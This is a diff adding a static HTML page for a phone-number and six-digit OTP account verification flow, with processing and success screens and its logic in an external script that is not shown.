@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Verification</title>
+  <link rel="stylesheet" href="/css/account-verification.css">
+</head>
+<body>
+  <div class="container" id="step1">
+    <h2>Account Verification</h2>
+    <p>Enter your phone number to continue</p>
+    <input type="text" id="phone" placeholder="Enter phone number">
+    <button onclick="sendOTP()">Send OTP</button>
+  </div>
+
+  <div class="container hidden" id="step2">
+    <h2>Account Verification</h2>
+    <p id="otpMessage"></p>
+    <div class="otp-input">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+    </div>
+    <button onclick="verifyOTP()">Submit</button>
+    <p id="errorMsg" class="error hidden">Wrong OTP! Try again 😜</p>
+  </div>
+
+  <div class="container hidden" id="step3">
+    <div class="loader"></div>
+    <div class="processing">Processing your request... ⏳</div>
+  </div>
+
+  <div class="container hidden" id="step4">
+    <div class="success">Your account has been verified successfully!</div>
+  </div>
+
+  <script src="/js/account-verification.js"></script>
+</body>
+</html>
